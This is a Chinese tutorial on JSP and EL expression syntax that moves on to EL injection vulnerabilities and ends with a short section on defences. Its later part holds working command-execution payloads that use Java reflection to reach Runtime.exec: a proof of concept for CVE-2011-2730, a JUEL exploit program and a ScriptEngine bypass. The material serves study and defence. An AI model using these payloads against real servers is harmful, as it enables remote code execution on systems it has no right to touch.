    EL 表达式注入 #

    JSP #

    在学习 EL 表达式之前，我们先学一下 JSP 这个技术。

    简介 #

    JSP（JavaServer Pages）是 Java 技术体系中用于开发动态 Web 页面的技术。简单来说，JSP 允许我们在 HTML 页面中嵌入 Java 代码，由服务器执行后生成动态内容返回给浏览器。

    本质 #

    JSP 文件后缀是.jsp，里面主要是 HTML，但是可以穿插 Java 代码。服务器（比如 Tomcat）第一次收到请求时，会把 JSP 翻译成一个 Java Servlet 文件（.java文件），再编译成.class文件执行。所有 JSP 本质上就是 Servlet，只是写起来更像 HTML。

    为什么会有 JSP #

    早期 Servlet 直接输出 HTML 很麻烦：

    out.println("<html><body>");
out.println("<h1>Hello</h1>");
out.println("</body></html>");

    而 JSP 让开发者可以这么写：

    <html>
<body>
    <h1>Hello</h1>
</body>
</html>

    需要动态内容时再嵌入 Java，写页面的时候更加方便。

    基本语法 #

    脚本元素 #

    类型语法作用
    脚本片段<% Java代码 %>插入 Java 逻辑
    表达式<%= 表达式 %>输出结果到页面
    声明<%! 变量/方法 %>定义类成员

    例如：

    <% int count = 10; %>
<p>数量：<%= count %></p>
<%! private int add(int a, int b) { return a + b; } %>

    指令 #

    <%@ page contentType="text/html;charset=UTF-8" %>
<%@ include file="header.jsp" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
    • page：设置页面属性，如编码、导入包
    • include：静态包含另一个文件
    • taglib：引入标签库，比如 JSTL

    动作标签 #

    <jsp:include page="header.jsp" />
<jsp:forward page="login.jsp" />
<jsp:useBean id="user" class="com.example.User" />

    注释 #

    <%-- JSP注释，不会发送到浏览器 --%>
<!-- HTML注释，会发送到浏览器 -->

    JSP 内置对象 #

    JSP 直接提供了 9 个内置对象，不用自己创建：

    对象类型作用
    requestHttpServletRequest请求信息
    responseHttpServletResponse响应
    sessionHttpSession会话
    applicationServletContext全局上下文
    outJspWriter输出
    pageObject当前页面实例
    pageContextPageContext页面上下文
    configServletConfig配置
    exceptionThrowable异常（错误页用）

    例如：

    <%
    String name = request.getParameter("name");
    session.setAttribute("user", name);
%>
<p>你好，<%= name %></p>

    JSP 的两种包含 #

    • 静态包含 <%@ include file="..." %>：编译时合并，合成一个文件。
    • 动态包含 <jsp:include page="..." />：运行时分别执行，各自独立。

    JSP 缺点 #

    通过上面的案例，可以发现 JSP 的很多缺点。

    由于 JSP 页面中既可以定义 HTML 标签，又可以定义 Java 代码，造成了一下问题：

    1. 难写难读难维护
    2. 书写麻烦，尤其是复杂的页面
    3. 既要写 HTML 标签，还要写 Java 代码
    4. 复杂度高，运行时需要依赖各种环境，JRE、JSP 容器、JavaEE等
    5. 占内存和磁盘，JSP 会自动生成.java和.class文件占磁盘，运行的是.class文件占内存
    6. 调试困难，出错后需要找到自动生成的.java文件进行调试
    7. 不利于团队协作，前端人员不会 Java，后端人员不精 HTML
    8. 如果页面布局发生变化，前端工程师对静态页面进行修改，然后再交给后端工程师，由后端工程师再将该页面改为 JSP 页面

    由于这些问题，JSP 已经逐渐退出历史舞台，以后开发更多的是使用 HTML + Ajax 来进行替代。Ajax 是异步的 JavaScript，有了这个技术之后，前端工程师只负责前端的开发，后端工程师只负责后端代码的开发。

    但是依然有时候不得不使用 JSP 进行开发，这时候就要介绍 EL 表达式了。

    EL 表达式基础语法 #

    EL 全称 Expression Language，即表达式语言。作用：

    1. 用于简化 JSP 页面内的 Java 代码
    2. 主要作用是获取数据，其实就是从域对象中获取数据，然后将数据展示在页面上。

    域对象就是“存放数据的地方”，而且有“作用范围（作用域）”。 数据存进去后，在它对应的范围内，任何地方都能取出来用。

    Servlet 和 JSP 之间就是靠域对象传递数据的——Servlet 把数据放进去，JSP 从里面取出来展示。

    JSP/Servlet 里有 4 个域对象，作用范围从小到大：

    域对象类型作用范围生命周期
    pageContextPageContext当前页面当前 JSP 页面执行期间
    requestHttpServletRequest一次请求请求开始到响应结束
    sessionHttpSession一次会话浏览器打开到关闭（或超时）
    applicationServletContext整个应用服务器启动到关闭

    用法：

    要先通过 page 标签设置不忽略 EL 表达式：

    <%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>

    语法：

    ${expression}

    在 JSP 中我们这可以这么写：

    ${brans}，这是一个很神奇的机制。${brans}是获取域中存储的key作为brands的数据。JSP 中就有我们上面写的那四大域。

    EL 表达式会依次从这四个域中寻找，直到找到为止，这四个域对象的作用范围：

    例如：${brands}，EL 表达式获取数据，会先从page域对象中获取数据，如果没找到就会去request域对象中获取数据，如果再没有找到就去session域对象中获取，如果还没有才会去application中获取数据，感觉和双亲委派机制有点像啊。

    EL 表达式 Demo #

    使用 EL 表达式来获取数据，需要按照顺序完成几个步骤：

    • 获取数据，比如从数据库中拿到数据
    • 将数据存储到request域中
    • 转发到对应的 jsp 文件。通过转发，我们才能使用request域对象进行数据共享

    运算符 #

    存取数据的运算符 #

    EL 表达式提供.和[]两种运算符来存取数据。

    当要存取的属性名称中包含一些特殊字符，比如.和-等并非字母或数字的符合，就一定要用[]，例如：${user.My-Name} 应当改为 ${user["My-Name"]}。

    如果要动态取值，就可以用[]来做，而.无法做到动态取值，例如：${sessionScope.user[data]}中 data 是一个变量。

    empty 运算符 #

    empty用来判断 EL 表达式中的对象或者变量是否为空。如果为空或者null。返回 true，否则返回 false。

    条件表达式 #

    EL 表达式中，条件运算符的语法和 Java 的完全一致：

    ${条件表达式?表达式1:表达式2}

    变量 #

    EL 表达式存取变量数据的方法很简单，比如${username}，意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依照顺序从 Page、Request、Session、Application 范围查找。加入途中找到username，就直接回传，不再继续找下去，但是如果全部范围内都没找到，就回传""。

    四大域域在EL中的名称
    PagePageScope
    RequestRequestScope
    SessionSessionScope
    ApplicationApplicationScope

    Booleantrue 和 false

    JSP 表达式语言提供以下操作符，其中大部分是 Java 中常用的操作符：

    术语定义
    算术型+、-（二元）、*、/、div、%、mod、-（一元）
    逻辑型and、&&、or、双管道符、!、not
    关系型==、eq、!=、ne、<、lt、>、gt、<=、le、>=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。
    空empty 空操作符是前缀操作，可用于确定值是否为空。
    条件型A ?B :C。根据 A 赋值的结果来赋值 B 或 C。

    隐式对象 #

    JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：

    术语定义
    pageContextJSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response}为页面的响应对象赋值。

    此外，还提供几个隐式对象，允许对以下对象进行简易访问：

    术语定义
    param将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param.name}相当于 request.getParameter (name)。
    paramValues将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。
    header将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。
    headerValues将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式${headerValues. name}相当于 request.getHeaderValues(name)。
    cookie将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式${cookie.name.value}返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用${headerValues.name}表达式。
    initParam将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。

    除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：

    术语定义
    pageScope将页面范围的变量名称映射到其值。例如，EL 表达式可以使用${pageScope.objectName}访问一个 JSP 中页面范围的对象，还可以使用${pageScope.objectName.attributeName}访问对象的属性。
    requestScope将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用${requestScope. objectName}访问一个 JSP 请求范围的对象，还可以使用${requestScope.objectName.attributeName}访问对象的属性。
    sessionScope将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：${sessionScope.name}
    applicationScope将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。
    pageContext 对象 #

    pageContext对象是 JSP 中pageContext对象的引用。通过pageContext对象，我们可以访问request对象，比如访问request对象传入的查询字符串：

    ${pageContext.request.queryString}
    Scope 对象 #

    pageScope，requestScope，sessionScope，applicationScope 变量用来访问存储在各个作用域层次的变量。

    如果我们想要显式访问在 applicationScope 层的 box 变量，可以这样来访问：

    applicationScope.box

    object.jsp：

    <%@ page contentType="text/html;charset=UTF-8" language="java" %>

${pageContext.request.queryString}

<%
  pageContext.setAttribute("name","solo_page");

    param 和 paramValues 对象 #

    param和paramValues对象用来访问参数值，通过使用request.getParameter和request.getParameterValues方法。

    比如我们访问一个名为order的参数，可以这么写：

    ${param.order}，或者${param["order"]}。

    下面的例子表明了如何访问request中的username参数：

    <%@ page import="java.io.*,java.util.*" %>
<%
    String title = "Accessing Request Param";
%>
<html>
<head>
<title><% out.print(title); %></title>
</head>
<body>
<center>
<h1><% out.print(title); %></h1>
</center>
<div align="center">
<p>${param["username"]}</p>
</div>
</body>
</html>

    param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。

    header 和 headerValues 对象 #

    header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。比如，我们要访问 UA 头，可以这么写：${header.user-agent}，也可以${header["user-agent"]}。

    <p>${header["user-agent"]}</p>

    EL 中的函数 #

    EL 允许我们在表达式中使用函数，这些函数必须被定义在自定义标签库中。函数的使用语法：

    ${ns:func(param1, param2, ...)}

    ns指命名空间，func指函数的名称，然后就是参数列表。比如：有函数fn:length，在 JSTL 库中定义，可以像下面这样来获取一个字符串的长度：

    ${fn:length("Get my length")}

    要使用任何标签库中的函数，我们需要把这些库安装在服务器上，然后使用<taglib>标签在 JSP 文件中包含这些库。

    EL 表达式调用 Java 方法 #

    先新建一个 ELFunc 类，其中定义的doSomething()方法用于给输入的字符串拼接.com：

    package eltest;

public class ELFunc {
    public static String doSomething(String str){
        return str + ".com";
    }
}

    然后在 WEB-INF 文件夹下新建 test.tld 文件，其中指定执行的 Java 方法以及 URI 地址：

    <?xml version="1.0" encoding="UTF-8"?>
<taglib version="2.0" xmlns="http://java.sun.com/xml/ns/j2ee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd">
    <tlib-version>1.0</tlib-version>
    <short-name>ELFunc</short-name>
    <uri>http://localhost/ELFunc</uri>
    <function>
        <name>doSomething</name>
        <function-class>eltest.ELFunc</function-class>
        <function-signature> java.lang.String doSomething(java.lang.String)</function-signature>
    </function>
</taglib>

    在 JSP 文件中，先头部导入taglib标签库，URI 为test.tld中设置的 URI 地址，prefix 为test.tld中设置的 short-name，然后直接在 EL 表达式中使用类名:方法名()的形式来调用该类方法。

    <%@taglib uri="http://localhost/ELFunc" prefix="ELFunc"%>
${ELFunc:doSomething("solowalker")}

    JSP 中启动/禁用 EL 表达式 #

    全局禁用 EL 表达式 #

    web.xml 中进行配置：

    <jsp-config>
    <jsp-property-group>
        <url-pattern>*.jsp</url-pattern>
        <el-ignored>true</el-ignored>
    </jsp-property-group>
</jsp-config>

    单个文件禁用 EL 表达式 #

    在 JSP 中可以有如下定义：

    <%@ page isELIgnored="true" %>

    该语句表示是否禁用 EL 表达式。JSP2.0 中默认启用 EL 表达式。

    EL 表达式注入漏洞 #

    EL 表达式注入漏洞和之前学习的 SpEL 表达式注入是一样的原理，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。

    一般来说，EL 表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的 EL 表达式内容全部或者部分是从外部获取的。

    通用 POC #

    //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

//文件头参数
${header}

//获取webRoot
${applicationScope}

//执行命令
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}

    简单漏洞场景 #

    比如我们有一个参数a是可控的，并且可以直接插入到 JSP 代码中，这种场景是非常常见的。举一个简单的例子，如果登录界面username可控，并且在判断不严格的情况下，就可以造成这种攻击。

    我们在 Java 程序中可以控制输入 EL 表达式如下：

    ${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}

    但是在实际场景中，是几乎没有也无法直接从外部控制 JSP 页面中的 EL 表达式的，而目前已知的 EL 表达式注入漏洞都是框架层面服务端执行的 EL 表达式外部可控导致的。

    CVE-2011-2730 #

    参考：Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730）

    命令执行 POC：

    <spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}"></spring:message>

    正常情况下：

    <%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<spring:message  text="${param.a}"></spring:message>

    这里使用message标签，text属性用 EL 表达式从请求参数中取值，当我们这么写：

    http://localhost/test.jsp?a=${applicationScope}

    ${applicationScope}这部分就被当作 EL 表达式被执行。

    JUEL 示例 #

    EL 曾经是 JSTL 的一部分，后来 EL 进入 JSP 2.0 标准。现在尽管是 JSP 2.1的一部分，但是 EL API 已经被分离到包javax.el中，并且已经删除了对核心 JSP 类的所有依赖关系，所有现在 EL 已经要在非 JSP 应用程序中使用了。现在 EL 表达式所依赖的包javax.el等都在JUEL相关的 jar 包中。

    JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能、插件化缓存、小体积、支持方法调用和多参数调用、可插拔等多种特性。

    官网：http://juel.sourceforge.net/

    需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。

    这里写一个简单的利用反射调用Runtime类方法实现命令执行的代码。

    package com.juelvul;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.TreeValueExpression;
import de.odysseus.el.util.SimpleContext;

public class juelExec {
    public static void main(String[] args) {
        ExpressionFactoryImpl expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        TreeValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}

    下面简单讲讲这个代码。

    首先我们创建 JUEL 的表达式工厂ExpressionFactoryImpl，这个类的作用是作为创建和编译 EL 表达式的入口工厂，负责把字符串形式的 EL 编译成可执行对象。

    然后创建一个上下文SimpleContext，这个类负责在 EL 表达式编译和求值过程中提供运行环境。

    然后我们定义我们的 exp，也就是一个反射调用的 EL 表达式。然后我们调用createValueExpression()这个方法，把一个 EL 表达式字符串编译成一个ValueExpression对象，从而把字符串变成一个可执行程序。生成的TreeValueExpression对象代表一个已经被解析成语法树的、可反复求值的 EL 表达式。

    EL 表达式的 EXP 与基础绕过 #

    基础 EXP #

    "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}"

    利用 ScriptEngine 调用 JS 引擎绕过 #

    这里和 SpEL 中的绕过一样：

    import de.odysseus.el.ExpressionFactoryImpl;  
import de.odysseus.el.util.SimpleContext;  
  
import javax.el.ExpressionFactory;  
import javax.el.ValueExpression;  
  
public class ScriptEngineExec {  
    public static void main(String[] args) {  
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  
        SimpleContext simpleContext = new SimpleContext();  
        String exp = "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('Calc.exe')\")}\n"+" ";  
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  
        System.out.println(valueExpression.getValue(simpleContext));  
    }  
}

    防御方法 #

    • 尽量不使用外部输入的内容作为 EL 表达式内容；
    • 若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；
    • 如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：
    javax.el.ExpressionFactory.createValueExpression()
javax.el.ValueExpression.getValue()
